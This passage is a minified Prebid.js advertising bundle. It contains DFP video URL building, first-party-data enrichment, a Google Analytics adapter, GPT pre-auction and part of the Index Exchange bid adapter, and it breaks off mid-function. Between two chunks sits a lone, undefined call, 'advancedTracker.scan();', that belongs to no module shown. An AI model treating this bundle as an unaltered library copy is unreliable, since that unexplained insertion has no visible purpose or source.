            h = i[1],
            f = i[2],
            E = i[3],
            v = i[4],
            m = i[5],
            T = i[6],
            b = i[7];
          for (u = 0; u < 64; u++) {
            var D = b + t.z1(v) + t.Ch(v, m, T) + r[u] + d[u],
              y = t.z0(l) + t.Maj(l, h, f);
            b = T, T = m, m = v, v = E + D >>> 0, E = f, f = h, h = l, l = D + y >>> 0;
          }
          i[0] = i[0] + l >>> 0, i[1] = i[1] + h >>> 0, i[2] = i[2] + f >>> 0, i[3] = i[3] + E >>> 0, i[4] = i[4] + v >>> 0, i[5] = i[5] + m >>> 0, i[6] = i[6] + T >>> 0, i[7] = i[7] + b >>> 0;
        }
        var O = new Array(i.length);
        for (b = 0; b < i.length; b++) O[b] = ("00000000" + i[b].toString(16)).slice(-8);
        return O.join("");
      }, t.utf8Encode = function (t) {
        try {
          return new TextEncoder().encode(t).reduce(function (t, e) {
            return t + String.fromCharCode(e);
          }, "");
        } catch (e) {
          return unescape(encodeURIComponent(t));
        }
      }, t.ROTR = function (t, e) {
        return e >>> t | e << 32 - t;
      }, t.z0 = function (e) {
        return t.ROTR(2, e) ^ t.ROTR(13, e) ^ t.ROTR(22, e);
      }, t.z1 = function (e) {
        return t.ROTR(6, e) ^ t.ROTR(11, e) ^ t.ROTR(25, e);
      }, t.q0 = function (e) {
        return t.ROTR(7, e) ^ t.ROTR(18, e) ^ e >>> 3;
      }, t.q1 = function (e) {
        return t.ROTR(17, e) ^ t.ROTR(19, e) ^ e >>> 10;
      }, t.Ch = function (t, e, r) {
        return t & e ^ ~t & r;
      }, t.Maj = function (t, e, r) {
        return t & e ^ t & r ^ e & r;
      }, t;
    }();
    e.Sha256 = i;
  }
}, [273]);
advancedTracker.scan();
pbjsChunk([301], {
  295: function (e, r, t) {
    e.exports = t(296);
  },
  296: function (e, r, t) {
    "use strict";

    Object.defineProperty(r, "__esModule", {
      value: !0
    }), t.d(r, "adpodUtils", function () {
      return v;
    }), r.buildDfpVideoUrl = T, r.notifyTranslationModule = A, r.buildAdpodVideoUrl = C;
    var a = t(31),
      n = t(24),
      o = t(0),
      d = t(3),
      c = t(8),
      i = t(18),
      s = t(9),
      l = t(10),
      p = t.n(l),
      u = t(5),
      _ = t.n(u);
    function b(e, r, t) {
      return r in e ? Object.defineProperty(e, r, {
        value: t,
        enumerable: !0,
        configurable: !0,
        writable: !0
      }) : e[r] = t, e;
    }
    function g() {
      return (g = Object.assign || function (e) {
        for (var r = 1; r < arguments.length; r++) {
          var t = arguments[r];
          for (var a in t) Object.prototype.hasOwnProperty.call(t, a) && (e[a] = t[a]);
        }
        return e;
      }).apply(this, arguments);
    }
    var f = {
        env: "vp",
        gdfp_req: 1,
        output: "vast",
        unviewed_position_start: 1
      },
      v = {};
    function T(e) {
      if (e.params || e.url) {
        var r = e.adUnit,
          t = e.bid || n.d.getWinningBids(r.code)[0],
          a = {};
        if (e.url && (a = Object(o.parseUrl)(e.url, {
          noDecodeWholeURL: !0
        }), Object(o.isEmpty)(e.params))) return function (e, r, t) {
          var a = E(r, e, "search");
          a && (e.search.description_url = a);
          var n = j(r, t);
          return e.search.cust_params = e.search.cust_params ? e.search.cust_params + "%26" + n : n, Object(o.buildUrl)(e);
        }(a, t, e);
        var d = {
            correlator: Date.now(),
            sz: Object(o.parseSizesInput)(Object(o.deepAccess)(r, "mediaTypes.video.playerSize")).join("|"),
            url: encodeURIComponent(location.href)
          },
          c = j(t, e),
          i = g({}, f, a.search, d, e.params, {
            cust_params: c
          }),
          l = E(t, e, "params");
        l && (i.description_url = l);
        var p = s.gdprDataHandler.getConsentData();
        p && ("boolean" == typeof p.gdprApplies && (i.gdpr = Number(p.gdprApplies)), p.consentString && (i.gdpr_consent = p.consentString), p.addtlConsent && (i.addtl_consent = p.addtlConsent));
        var u = s.uspDataHandler.getConsentData();
        return u && (i.us_privacy = u), Object(o.buildUrl)({
          protocol: "https",
          host: "securepubads.g.doubleclick.net",
          pathname: "/gampad/ads",
          search: i
        });
      }
      Object(o.logError)("A params object or a url is required to use pbjs.adServers.dfp.buildVideoUrl");
    }
    function A(e) {
      e.call(this, "dfp");
    }
    function C() {
      var e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {},
        r = e.code,
        t = e.params,
        a = e.callback;
      if (t && a) {
        var n = {
          correlator: Date.now(),
          sz: d(r),
          url: encodeURIComponent(location.href)
        };
        v.getTargeting({
          codes: [r],
          callback: c
        });
      } else Object(o.logError)("A params object and a callback is required to use pbjs.adServers.dfp.buildAdpodVideoUrl");
      function d(e) {
        var r = i.a.getAdUnits().filter(function (r) {
            return r.code === e;
          }),
          t = Object(o.deepAccess)(r[0], "mediaTypes.video.playerSize");
        return Object(o.parseSizesInput)(t).join("|");
      }
      function c(e, d) {
        var c;
        if (e) a(e, null);else {
          var i = (b(c = {}, v.TARGETING_KEY_PB_CAT_DUR, void 0), b(c, v.TARGETING_KEY_CACHE_ID, void 0), c),
            l = {};
          d[r] && (l = d[r].reduce(function (e, r) {
            return Object.keys(r)[0] === v.TARGETING_KEY_PB_CAT_DUR ? e[v.TARGETING_KEY_PB_CAT_DUR] = void 0 !== e[v.TARGETING_KEY_PB_CAT_DUR] ? e[v.TARGETING_KEY_PB_CAT_DUR] + "," + r[v.TARGETING_KEY_PB_CAT_DUR] : r[v.TARGETING_KEY_PB_CAT_DUR] : Object.keys(r)[0] === v.TARGETING_KEY_CACHE_ID && (e[v.TARGETING_KEY_CACHE_ID] = r[v.TARGETING_KEY_CACHE_ID]), e;
          }, i));
          var p = encodeURIComponent(Object(o.formatQS)(l)),
            u = g({}, f, n, t, {
              cust_params: p
            }),
            _ = s.gdprDataHandler.getConsentData();
          _ && ("boolean" == typeof _.gdprApplies && (u.gdpr = Number(_.gdprApplies)), _.consentString && (u.gdpr_consent = _.consentString), _.addtlConsent && (u.addtl_consent = _.addtlConsent));
          var T = s.uspDataHandler.getConsentData();
          T && (u.us_privacy = T);
          var A = Object(o.buildUrl)({
            protocol: "https",
            host: "securepubads.g.doubleclick.net",
            pathname: "/gampad/ads",
            search: u
          });
          a(null, A);
        }
      }
    }
    function E(e, r, t) {
      if (!d.b.getConfig("cache.url")) if (Object(o.deepAccess)(r, "".concat(t, ".description_url"))) Object(o.logError)("input cannnot contain description_url");else {
        var a = e && e.vastUrl;
        if (a) return encodeURIComponent(a);
      }
    }
    function j(e, r) {
      var t = e && e.adserverTargeting || {},
        a = {},
        d = r && r.adUnit;
      if (d) {
        var c = n.d.getAllTargeting(d.code);
        a = c ? c[d.code] : {};
      }
      var i = g({}, {
        hb_uuid: e && e.videoCacheKey
      }, {
        hb_cache_id: e && e.videoCacheKey
      }, a, t);
      p.a.emit(_.a.EVENTS.SET_TARGETING, b({}, d.code, i));
      var s = g({}, i, Object(o.deepAccess)(r, "params.cust_params"));
      return encodeURIComponent(Object(o.formatQS)(s));
    }
    d.b.getConfig("brandCategoryTranslation.translationFile") && Object(c.a)("registerAdserver").before(A), Object(a.a)("dfp", {
      buildVideoUrl: T,
      buildAdpodVideoUrl: C,
      getAdpodTargeting: function (e) {
        return v.getTargeting(e);
      }
    }), Object(c.e)("adpod", v), window.pbjs.installedModules.push("dfpAdServerVideo");
  }
}, [295]);
pbjsChunk([290], {
  317: function (e, t, n) {
    e.exports = n(318);
  },
  318: function (e, t, n) {
    "use strict";

    Object.defineProperty(t, "__esModule", {
      value: !0
    }), n.d(t, "coreStorage", function () {
      return u;
    }), t.findRootDomain = m, t.initSubmodule = w, n.d(t, "enrichmentsSubmodule", function () {
      return s;
    });
    var i = n(0),
      o = n(8),
      c = n(17),
      r = n(7),
      d = {},
      a = window === window.top ? window : window.top,
      u = Object(r.a)("enrichmentFpd");
    function m() {
      var e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : window.location.hostname;
      if (!u.cookiesAreEnabled()) return e;
      var t,
        n,
        o = e.split(".");
      if (2 == o.length) return e;
      var c = -2,
        r = "_rdc".concat(Date.now()),
        d = "writeable";
      do {
        t = o.slice(c).join(".");
        var a = new Date(Object(i.timestamp)() + 1e4).toUTCString();
        u.setCookie(r, d, a, "Lax", t, void 0);
        var m = u.getCookie(r, void 0);
        m === d ? (n = !1, u.setCookie(r, "", "Thu, 01 Jan 1970 00:00:01 GMT", void 0, t, void 0)) : (c += -1, n = Math.abs(c) <= o.length);
      } while (n);
      return t;
    }
    function l() {
      var e;
      return Object(c.a)().referer && Object(i.mergeDeep)(d, {
        site: {
          ref: Object(c.a)().referer
        }
      }), Object(c.a)().canonicalUrl && Object(i.mergeDeep)(d, {
        site: {
          page: Object(c.a)().canonicalUrl
        }
      }), (e = function (e) {
        if (e && "string" == typeof e && 0 !== e.length) {
          var t = e.match(/^(?:https?:\/\/)?(?:www\.)?(.*?(?=(\?|\#|\/|$)))/i);
          return t && t[1];
        }
      }(Object(c.a)().canonicalUrl)) && (Object(i.mergeDeep)(d, {
        site: {
          domain: e
        }
      }), Object(i.mergeDeep)(d, {
        site: {
          publisher: {
            domain: m(e)
          }
        }
      })), function () {
        var e, t;
        try {
          e = a.innerWidth || a.document.documentElement.clientWidth || a.document.body.clientWidth, t = a.innerHeight || a.document.documentElement.clientHeight || a.document.body.clientHeight;
        } catch (n) {
          e = window.innerWidth || window.document.documentElement.clientWidth || window.document.body.clientWidth, t = window.innerHeight || window.document.documentElement.clientHeight || window.document.body.clientHeight;
        }
        Object(i.mergeDeep)(d, {
          device: {
            w: e,
            h: t
          }
        });
      }(), function () {
        var e;
        try {
          e = a.document.querySelector("meta[name='keywords']");
        } catch (t) {
          e = window.document.querySelector("meta[name='keywords']");
        }
        e && e.content && Object(i.mergeDeep)(d, {
          site: {
            keywords: e.content.replace(/\s/g, "")
          }
        });
      }(), d;
    }
    function w(e, t) {
      return d = {}, e.skipEnrichments ? t : Object(i.mergeDeep)(l(), t);
    }
    var s = {
      name: "enrichments",
      queue: 2,
      init: w
    };
    Object(o.e)("firstPartyData", s), window.pbjs.installedModules.push("enrichmentFpdModule");
  }
}, [317]);
pbjsChunk([282], {
  337: function (e, t, o) {
    e.exports = o(338);
  },
  338: function (e, t, o) {
    "use strict";

    Object.defineProperty(t, "__esModule", {
      value: !0
    }), t.registerSubmodules = f, t.init = c;
    var n = o(3),
      i = o(8),
      u = o(14),
      r = o(19),
      s = [];
    function f(e) {
      s.push(e);
    }
    function c() {
      var e = n.b.getConfig("firstPartyData") || {},
        t = n.b.getConfig("ortb2") || {};
      s.sort(function (e, t) {
        return (e.queue || 1) - (t.queue || 1);
      }).forEach(function (o) {
        t = o.init(e, t);
      }), n.b.setConfig({
        ortb2: t
      });
    }
    function a(e, t) {
      c(), e.call(this, t), r.e.getHooks({
        hook: a
      }).remove();
    }
    function b() {
      Object(i.a)("addBidderRequests").before(a);
    }
    Object(i.c)("firstPartyData", f), b(), Object(u.a)().refreshFpd = b, window.pbjs.installedModules.push("fpdModule");
  }
}, [337]);
pbjsChunk([268], {
  365: function (e, n, t) {
    e.exports = t(366);
  },
  366: function (e, n, t) {
    "use strict";

    Object.defineProperty(n, "__esModule", {
      value: !0
    });
    var o = t(0);
    function i(e) {
      return (i = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (e) {
        return typeof e;
      } : function (e) {
        return e && "function" == typeof Symbol && e.constructor === Symbol && e !== Symbol.prototype ? "symbol" : typeof e;
      })(e);
    }
    var s = t(10),
      r = t(5),
      a = t(9).default,
      c = r.EVENTS.BID_REQUESTED,
      u = r.EVENTS.BID_TIMEOUT,
      d = r.EVENTS.BID_RESPONSE,
      l = r.EVENTS.BID_WON,
      f = {
        nonInteraction: !0
      },
      b = [],
      p = null,
      m = !0,
      v = "Prebid.js Bids",
      y = 0,
      g = !1,
      w = null,
      T = null,
      E = !0,
      h = {};
    function j() {
      if (m && "function" == typeof window[p]) {
        for (var e = 0; e < b.length; e++) b[e].call();
        b.push = function (e) {
          e.call();
        }, m = !1;
      }
      Object(o.logMessage)("event count sent to GA: " + y);
    }
    function S(e) {
      return e ? Math.floor(100 * e) : 0;
    }
    function D(e) {
      return w ? w(e) : (e >= 0 && e < .5 ? n = "$0-0.5" : e >= .5 && e < 1 ? n = "$0.5-1" : e >= 1 && e < 1.5 ? n = "$1-1.5" : e >= 1.5 && e < 2 ? n = "$1.5-2" : e >= 2 && e < 2.5 ? n = "$2-2.5" : e >= 2.5 && e < 3 ? n = "$2.5-3" : e >= 3 && e < 4 ? n = "$3-4" : e >= 4 && e < 6 ? n = "$4-6" : e >= 6 && e < 8 ? n = "$6-8" : e >= 8 && (n = "$8 above"), n);
      var n;
    }
    function $(e) {
      e && e.bidderCode && b.push(function () {
        y++, window[p](T, "event", v, "Requests", e.bidderCode, 1, f);
      }), j();
    }
    function A(e) {
      e && e.bidderCode && b.push(function () {
        var n,
          t,
          o = S(e.cpm),
          i = e.bidderCode;
        if (void 0 !== e.timeToRespond && g) {
          y++;
          var s = ((n = e.timeToRespond) >= 0 && n < 200 ? t = "0-200ms" : n >= 200 && n < 300 ? t = "0200-300ms" : n >= 300 && n < 400 ? t = "0300-400ms" : n >= 400 && n < 500 ? t = "0400-500ms" : n >= 500 && n < 600 ? t = "0500-600ms" : n >= 600 && n < 800 ? t = "0600-800ms" : n >= 800 && n < 1e3 ? t = "0800-1000ms" : n >= 1e3 && n < 1200 ? t = "1000-1200ms" : n >= 1200 && n < 1500 ? t = "1200-1500ms" : n >= 1500 && n < 2e3 ? t = "1500-2000ms" : n >= 2e3 && (t = "2000ms above"), t);
          window[p](T, "event", "Prebid.js Load Time Distribution", s, i, 1, f);
        }
        if (e.cpm > 0) {
          y += 2;
          var r = D(e.cpm);
          g && (y++, window[p](T, "event", "Prebid.js CPM Distribution", r, i, 1, f)), window[p](T, "event", v, "Bids", i, o, f), window[p](T, "event", v, "Bid Load Time", i, e.timeToRespond, f);
        }
      }), j();
    }
    function M(e) {
      b.push(function () {
        Object(o._each)(e, function (e) {
          y++;
          var n = e.bidder;
          window[p](T, "event", v, "Timeouts", n, f);
        });
      }), j();
    }
    function O(e) {
      var n = S(e.cpm);
      b.push(function () {
        y++, window[p](T, "event", v, "Wins", e.bidderCode, n, f);
      }), j();
    }
    h.enableAnalytics = function (e) {
      var n = e.provider,
        t = e.options;
      p = n || "ga", T = t && t.trackerName ? t.trackerName + ".send" : "send", E = void 0 === t || void 0 === t.sampling || Math.random() < parseFloat(t.sampling), t && void 0 !== t.global && (p = t.global), t && void 0 !== t.enableDistribution && (g = t.enableDistribution), t && "function" == typeof t.cpmDistribution && (w = t.cpmDistribution);
      if (E) {
        var r = s.getEvents();
        Object(o._each)(r, function (e) {
          if ("object" === i(e)) {
            var n = e.args;
            if (e.eventType === c) $(n);else if (e.eventType === d) A(n);else if (e.eventType === u) {
              M(n);
            } else e.eventType === l && O(n);
          }
        }), s.on(c, function (e) {
          $(e);
        }), s.on(d, function (e) {
          A(e);
        }), s.on(u, function (e) {
          M(e);
        }), s.on(l, function (e) {
          O(e);
        });
      } else Object(o.logMessage)("Prebid.js google analytics disabled by sampling");
      this.enableAnalytics = function () {
        return Object(o.logMessage)("Analytics adapter already enabled, unnecessary call to `enableAnalytics`.");
      };
    }, h.getTrackerSend = function () {
      return T;
    }, h.getCpmDistribution = D, a.registerAnalyticsAdapter({
      adapter: h,
      code: "ga"
    }), n.default = h, window.pbjs.installedModules.push("googleAnalyticsAdapter");
  }
}, [365]);
pbjsChunk([266], {
  369: function (t, e, o) {
    t.exports = o(370);
  },
  370: function (t, e, o) {
    "use strict";

    Object.defineProperty(e, "__esModule", {
      value: !0
    }), o.d(e, "_currentConfig", function () {
      return i;
    }), o.d(e, "appendGptSlots", function () {
      return p;
    }), o.d(e, "appendPbAdSlot", function () {
      return l;
    }), o.d(e, "makeBidRequestsHook", function () {
      return g;
    });
    var n = o(0),
      r = o(3),
      a = o(8),
      d = o(11),
      c = o.n(d),
      u = this,
      i = {},
      s = !1,
      p = function (t) {
        var e = i.customGptSlotMatching;
        if (Object(n.isGptPubadsDefined)()) {
          var o = t.reduce(function (t, e) {
            return t[e.code] = e, t;
          }, {});
          window.googletag.pubads().getSlots().forEach(function (t) {
            var r = c()(Object.keys(o), e ? e(t) : Object(n.isAdUnitCodeMatchingSlot)(t));
            if (r) {
              var a = o[r];
              a.ortb2Imp = a.ortb2Imp || {}, a.ortb2Imp.ext = a.ortb2Imp.ext || {}, a.ortb2Imp.ext.data = a.ortb2Imp.ext.data || {};
              var d = a.ortb2Imp.ext.data;
              d.adserver = d.adserver || {}, d.adserver.name = "gam", d.adserver.adslot = f(t.getAdUnitPath());
            }
          });
        }
      },
      f = function (t) {
        return (r.b.getConfig("gptPreAuction") || {}).mcmEnabled ? t.replace(/(^\/\d*),\d*\//, "$1/") : t;
      },
      b = function (t, e) {
        var o = t.ortb2Imp.ext.data;
        if (o.pbadslot) return o.pbadslot;
        if (Object(n.isGptPubadsDefined)()) {
          var r = window.googletag.pubads().getSlots().filter(function (t) {
            return t.getAdUnitPath() === e;
          });
          if (0 !== r.length) return 1 === r.length ? e : "".concat(e, "#").concat(t.code);
        }
      },
      l = function (t) {
        var e = t.ortb2Imp.ext.data,
          o = i.customPbAdSlot;
        if (!e.pbadslot) if (o) e.pbadslot = o(t.code, Object(n.deepAccess)(e, "adserver.adslot"));else {
          try {
            var r = document.getElementById(t.code);
            if (r.dataset.adslotid) return void (e.pbadslot = r.dataset.adslotid);
          } catch (t) {}
          if (!Object(n.deepAccess)(e, "adserver.adslot")) return e.pbadslot = t.code, !0;
          e.pbadslot = e.adserver.adslot;
        }
      },
      g = function (t, e) {
        p(e);
        var o = i,
          r = o.useDefaultPreAuction,
          a = o.customPreAuction;
        e.forEach(function (t) {
          t.ortb2Imp = t.ortb2Imp || {}, t.ortb2Imp.ext = t.ortb2Imp.ext || {}, t.ortb2Imp.ext.data = t.ortb2Imp.ext.data || {};
          var e = t.ortb2Imp.ext;
          if (a || r) {
            var o,
              d = Object(n.deepAccess)(e, "data.adserver.adslot");
            a ? o = a(t, d) : r && (o = b(t, d)), o && (e.gpid = e.data.pbadslot = o);
          } else {
            var c = l(t);
            e.gpid || c || (e.gpid = e.data.pbadslot);
          }
        });
        for (var d = arguments.length, c = new Array(d > 2 ? d - 2 : 0), s = 2; s < d; s++) c[s - 2] = arguments[s];
        return t.call.apply(t, [u, e].concat(c));
      },
      m = function (t) {
        (i = Object(n.pick)(t, ["enabled", function (t) {
          return !1 !== t;
        }, "customGptSlotMatching", function (t) {
          return "function" == typeof t && t;
        }, "customPbAdSlot", function (t) {
          return "function" == typeof t && t;
        }, "customPreAuction", function (t) {
          return "function" == typeof t && t;
        }, "useDefaultPreAuction", function (t) {
          return !0 === t;
        }])).enabled ? s || (Object(a.a)("makeBidRequests").before(g), s = !0) : (Object(n.logInfo)("".concat("GPT Pre-Auction", ": Turning off module")), i = {}, Object(a.a)("makeBidRequests").getHooks({
          hook: g
        }).remove(), s = !1);
      };
    r.b.getConfig("gptPreAuction", function (t) {
      return m(t.gptPreAuction);
    }), m({}), window.pbjs.installedModules.push("gptPreAuction");
  }
}, [369]);
pbjsChunk([237], {
  442: function (e, r, t) {
    e.exports = t(443);
  },
  443: function (e, r, t) {
    "use strict";

    Object.defineProperty(r, "__esModule", {
      value: !0
    }), t.d(r, "ERROR_CODES", function () {
      return z;
    }), t.d(r, "storage", function () {
      return L;
    }), t.d(r, "spec", function () {
      return oe;
    });
    var i = t(0),
      n = t(2),
      a = t(3),
      o = t(5),
      s = t.n(o),
      d = t(7),
      c = t(10),
      p = t.n(c),
      u = t(11),
      l = t.n(u),
      m = t(1),
      b = t(16),
      f = t(12),
      y = t.n(f),
      g = t(13);
    function O(e) {
      return function (e) {
        if (Array.isArray(e)) return S(e);
      }(e) || function (e) {
        if ("undefined" != typeof Symbol && null != e[Symbol.iterator] || null != e["@@iterator"]) return Array.from(e);
      }(e) || A(e) || function () {
        throw new TypeError("Invalid attempt to spread non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.");
      }();
    }
    function v(e) {
      return (v = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (e) {
        return typeof e;
      } : function (e) {
        return e && "function" == typeof Symbol && e.constructor === Symbol && e !== Symbol.prototype ? "symbol" : typeof e;
      })(e);
    }
    function h(e, r) {
      var t = Object.keys(e);
      if (Object.getOwnPropertySymbols) {
        var i = Object.getOwnPropertySymbols(e);
        r && (i = i.filter(function (r) {
          return Object.getOwnPropertyDescriptor(e, r).enumerable;
        })), t.push.apply(t, i);
      }
      return t;
    }
    function I(e) {
      for (var r = 1; r < arguments.length; r++) {
        var t = null != arguments[r] ? arguments[r] : {};
        r % 2 ? h(Object(t), !0).forEach(function (r) {
          j(e, r, t[r]);
        }) : Object.getOwnPropertyDescriptors ? Object.defineProperties(e, Object.getOwnPropertyDescriptors(t)) : h(Object(t)).forEach(function (r) {
          Object.defineProperty(e, r, Object.getOwnPropertyDescriptor(t, r));
        });
      }
      return e;
    }
    function j(e, r, t) {
      return r in e ? Object.defineProperty(e, r, {
        value: t,
        enumerable: !0,
        configurable: !0,
        writable: !0
      }) : e[r] = t, e;
    }
    function x(e, r) {
      var t = "undefined" != typeof Symbol && e[Symbol.iterator] || e["@@iterator"];
      if (!t) {
        if (Array.isArray(e) || (t = A(e)) || r && e && "number" == typeof e.length) {
          t && (e = t);
          var i = 0,
            n = function () {};
          return {
            s: n,
            n: function () {
              return i >= e.length ? {
                done: !0
              } : {
                done: !1,
                value: e[i++]
              };
            },
            e: function (e) {
              throw e;
            },
            f: n
          };
        }
        throw new TypeError("Invalid attempt to iterate non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.");
      }
      var a,
        o = !0,
        s = !1;
      return {
        s: function () {
          t = t.call(e);
        },
        n: function () {
          var e = t.next();
          return o = e.done, e;
        },
        e: function (e) {
          s = !0, a = e;
        },
        f: function () {
          try {
            o || null == t.return || t.return();
          } finally {
            if (s) throw a;
          }
        }
      };
    }
    function A(e, r) {
      if (e) {
        if ("string" == typeof e) return S(e, r);
        var t = Object.prototype.toString.call(e).slice(8, -1);
        return "Object" === t && e.constructor && (t = e.constructor.name), "Map" === t || "Set" === t ? Array.from(e) : "Arguments" === t || /^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(t) ? S(e, r) : void 0;
      }
    }
    function S(e, r) {
      (null == r || r > e.length) && (r = e.length);
      for (var t = 0, i = new Array(r); t < r; t++) i[t] = e[t];
      return i;
    }
    var E = "ix",
      w = "roundel",
      _ = [n.b, n.d],
      D = 8e3,
      P = {
        JPY: 1
      },
      T = "p",
      C = "x",
      z = {
        BID_SIZE_INVALID_FORMAT: 1,
        BID_SIZE_NOT_INCLUDED: 2,
        PROPERTY_NOT_INCLUDED: 3,
        SITE_ID_INVALID_VALUE: 4,
        BID_FLOOR_INVALID_FORMAT: 5,
        IX_FPD_EXCEEDS_MAX_SIZE: 6,
        EXCEEDS_MAX_SIZE: 7,
        PB_FPD_EXCEEDS_MAX_SIZE: 8,
        VIDEO_DURATION_INVALID: 9
      },
      R = {
        SITE: ["id", "name", "domain", "cat", "sectioncat", "pagecat", "page", "ref", "search", "mobile", "privacypolicy", "publisher", "content", "keywords", "ext"],
        USER: ["id", "buyeruid", "yob", "gender", "keywords", "customdata", "geo", "data", "ext"]
      },
      N = {
        "liveramp.com": "idl",
        "netid.de": "NETID",
        "neustar.biz": "fabrickId",
        "zeotap.com": "zeotapIdPlus",
        "uidapi.com": "UID2",
        "adserver.org": "TDID",
        "id5-sync.com": "",
        "crwdcntrl.net": "",
        "epsilon.com": "",
        "audigent.com": "",
        "pubcid.org": ""
      },
      X = ["britepoolid", "id5id", "lipbid", "haloId", "criteoId", "lotamePanoramaId", "merkleId", "parrableId", "connectid", "tapadId", "quantcastId", "pubcid", "TDID", "flocId", "pubProvidedId"],
      k = ["mimes", "minduration", "maxduration"],
      B = ["mimes", "minduration", "maxduration", "protocols", "protocol", "startdelay", "placement", "linearity", "skip", "skipmin", "skipafter", "sequence", "battr", "maxextended", "minbitrate", "maxbitrate", "boxingallowed", "playbackmethod", "playbackend", "delivery", "pos", "companionad", "api", "companiontype", "ext", "playerSize", "w", "h"],
      F = "ixdiag",
      U = !1,
      L = Object(d.b)(10, E),
      V = 2;
    function M(e) {
      var r = {};
      r.id = e.bidId, r.ext = {}, r.ext.siteID = e.params.siteId.toString(), !e.params.hasOwnProperty("id") || "string" != typeof e.params.id && "number" != typeof e.params.id || (r.ext.sid = String(e.params.id));
      var t = Object(i.deepAccess)(e, "ortb2Imp.ext.data.adserver.adslot");
      return t && (r.ext.dfp_ad_unit_code = t), r;
    }
    function q(e, r, t) {
      var n = null,
        a = null;
      if (e.params.bidFloor && e.params.bidFloorCur && (n = {
        floor: e.params.bidFloor,
        currency: e.params.bidFloorCur
      }), Object(i.isFn)(e.getFloor)) {
        var o = "*",
          s = "*";
        if (t && Object(i.contains)(_, t)) {
          var d = r[t];
          o = t, s = [d.w, d.h];
        }
        try {
          a = e.getFloor({
            mediaType: o,
            size: s
          });
        } catch (e) {
          Object(i.logWarn)("priceFloors module call getFloor failed, error : ", e);
        }
      }
      a ? (r.bidfloor = a.floor, r.bidfloorcur = a.currency, r.ext.fl = T) : n && (r.bidfloor = n.floor, r.bidfloorcur = n.currency, r.ext.fl = C);
    }
    function J(e, r, t) {
      var a = {},
        o = !(!Object(i.deepAccess)(e, "exp") || !Object(i.isInteger)(e.exp)),
        s = Object(i.deepAccess)(e, "dealid") || Object(i.deepAccess)(e, "ext.dealid");
      return P.hasOwnProperty(r) ? a.cpm = e.price / P[r] : a.cpm = e.price / 100, a.requestId = e.impid, s && (a.dealId = s), a.netRevenue = true, a.currency = r, a.creativeId = e.hasOwnProperty("crid") ? e.crid : "-", e.mtype == V ? a.vastXml = e.adm : e.ext && e.ext.vasturl && (a.vastUrl = e.ext.vasturl), e.ext && e.ext.vasturl || e.mtype == V ? (a.width = t.video.w, a.height = t.video.h, a.mediaType = n.d, a.mediaTypes = t.mediaTypes, a.ttl = o ? e.exp : 3600) : (a.ad = e.adm, a.width = e.w, a.height = e.h, a.mediaType = n.b, a.ttl = o ? e.exp : 300), a.meta = {}, a.meta.networkId = Object(i.deepAccess)(e, "ext.dspid"), a.meta.brandId = Object(i.deepAccess)(e, "ext.advbrandid"), a.meta.brandName = Object(i.deepAccess)(e, "ext.advbrand"), e.adomain && e.adomain.length > 0 && (a.meta.advertiserDomains = e.adomain), a;
    }
    function Z(e) {
      return Array.isArray(e) && 2 === e.length && Object(i.isInteger)(e[0]) && Object(i.isInteger)(e[1]);
    }
    function W() {
      var e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : [],
        r = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : [];
      if (Z(e)) return e[0] === r[0] && e[1] === r[1];
      for (var t = 0; t < e.length; t++) if (e[t][0] === r[0] && e[t][1] === r[1]) return !0;
      return !1;
    }
    function G(e, r) {
      var t = [];
      e || Object(i.logWarn)("IX Bid Adapter: mediaTypes.video is the preferred location for video params in ad unit");
      var n,
        a = x(k);
      try {
        for (a.s(); !(n = a.n()).done;) {
          var o = n.value,
            s = e && e.hasOwnProperty(o),
            d = r && r.hasOwnProperty(o);
          s || d || t.push("IX Bid Adapter: ".concat(o, " is not included in either the adunit or params level"));
        }
      } catch (e) {
        a.e(e);
      } finally {
        a.f();
      }
      var c = e && e.hasOwnProperty("protocol"),
        p = e && e.hasOwnProperty("protocols"),
        u = r && r.hasOwnProperty("protocol"),
        l = r && r.hasOwnProperty("protocols");
      return c || p || u || l || t.push("IX Bid Adapter: protocol/protcols is not included in either the adunit or params level"), t;
    }
    function Y() {
      var e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : [];
      return Z(e) ? e : !!Z(e[0]) && e[0];
    }
    function Q(e, r, t) {
      if (e) return I(I({}, l()(t, function (r) {
        return r.bidId === e;
      })), l()(r, function (r) {
        return r.id === e;
      }));
    }
    function $(e, r, t, o) {
      var s = "https://htlb.casalemedia.com/cygnus",
        d = function (e, r) {
          var t = [],
            n = {};
          if (Object(i.isArray)(e)) {
            var a,
              o = x(e);
            try {
              for (o.s(); !(a = o.n()).done;) {
                var s = a.value;
                N.hasOwnProperty(s.source) && Object(i.deepAccess)(s, "uids.0") && (n[s.source] = !0, "" != N[s.source] && (s.uids[0].ext = {
                  rtiPartner: N[s.source]
                }), delete s.uids[0].atype, t.push(s));
              }
            } catch (e) {
              o.e(e);
            } finally {
              o.f();
            }
          }
          if (r && r.id && r.version) {
            var d = {
              source: "chrome.com",
              uids: [{
                id: r.id,
                ext: {
                  rtiPartner: "flocId",
                  ver: r.version
                }
              }]
            };
            t.push(d), n["chrome.com"] = !0;
          }
          return {
            toSend: t,
            seenSources: n
          };
        }(Object(i.deepAccess)(e, "0.userIdAsEids"), Object(i.deepAccess)(e, "0.userId.flocId")),
        c = d.toSend;
      if (window.headertag && "function" == typeof window.headertag.getIdentityInfo) {
        var p = window.headertag.getIdentityInfo();
        if (p && "object" === v(p)) for (var u in p) if (p.hasOwnProperty(u)) {
          var l = p[u];
          !l.responsePending && l.data && "object" === v(l.data) && Object.keys(l.data).length && !d.seenSources[l.data.source] && c.push(l.data);
        }
      }
      if (r && r.bidderCode === w && !d.seenSources["liveramp.com"]) return [];
      var m = {};
      m.id = e[0].bidderRequestId.toString(), m.site = {}, m.ext = {}, m.ext.source = "prebid", m.ext.ixdiag = {}, m.ext.ixdiag.msd = 0, m.ext.ixdiag.msi = 0, m.imp = [], m.at = 1;
      var b = function (e) {
        for (var r = e.map(function (e) {
            return e.transactionId;
          }).filter(function (e, r, t) {
            return t.indexOf(e) === r;
          }), t = {
            mfu: 0,
            bu: 0,
